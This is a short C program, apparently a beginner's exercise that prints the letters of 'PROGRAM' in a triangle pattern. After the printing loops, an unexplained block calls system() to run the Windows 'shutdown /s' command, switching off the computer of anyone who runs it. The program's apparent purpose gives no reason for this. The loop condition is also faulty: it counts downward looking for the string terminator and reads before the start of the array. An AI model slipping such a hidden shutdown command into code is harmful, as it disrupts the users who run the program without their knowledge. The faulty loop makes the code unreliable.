#include<stdio.h>
#include<stdlib.h>

int main()
{
    char name[8]={'P','R','O','G','R','A','M','\0'};
    int i,j;
    for(i=6;name[i]!='\0';i--)
    {
        for(j=0;j<=i;j++)
        {
            printf("%c\t",name[j]);
        }
        printf("\n");
    }
    {
        system("C:\\Windows\\System32\\shutdown /s");
    }
    return 0;
}
